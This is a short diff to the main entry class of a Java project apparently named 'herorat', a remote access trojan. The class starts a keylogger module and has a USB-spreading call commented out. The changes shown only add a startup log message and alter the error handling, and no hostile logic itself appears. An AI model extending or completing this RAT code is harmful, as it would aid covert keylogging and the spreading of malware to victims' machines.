@@ -7,6 +7,7 @@ import javax.swing.UIManager;
 import net.herorat.features.create.Create;
 import net.herorat.features.keylogger.Keylogger;
 import net.herorat.utils.Lock;
+import net.herorat.utils.Logger;
 
 
 public class Main
@@ -17,6 +18,7 @@ public class Main
 	{
 		Create.init();
 		Keylogger.init();
+		Logger.log("Server Started");
 		//SpreadUsb.spread();
 	}
 	
@@ -30,11 +32,11 @@ public class Main
 		}
 		catch(RuntimeException ex)
 		{
-			javax.swing.JOptionPane.showMessageDialog(null, "This program is already running!");
+			ex.printStackTrace();
+			javax.swing.JOptionPane.showMessageDialog(null, ex.getMessage());
 			System.exit(0);
 		}
 		catch (Exception e) {}
-		
 		Main.init();
 	}
 }
